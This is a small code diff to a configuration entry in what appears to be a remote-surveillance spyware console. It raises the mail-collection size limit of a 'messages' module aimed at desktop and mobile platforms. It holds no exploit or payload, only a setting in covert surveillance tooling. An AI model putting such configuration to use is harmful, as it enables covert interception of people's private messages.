@@ -130,7 +130,7 @@ package it.ht.rcs.console
         
         {
           module: "messages",
-          mail: {filter: {maxsize: 0, datefrom: "2010-01-21 00:00:00", dateto: ''}},
+          mail: {filter: {maxsize: 100000, datefrom: "2010-01-21 00:00:00", dateto: ''}},
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
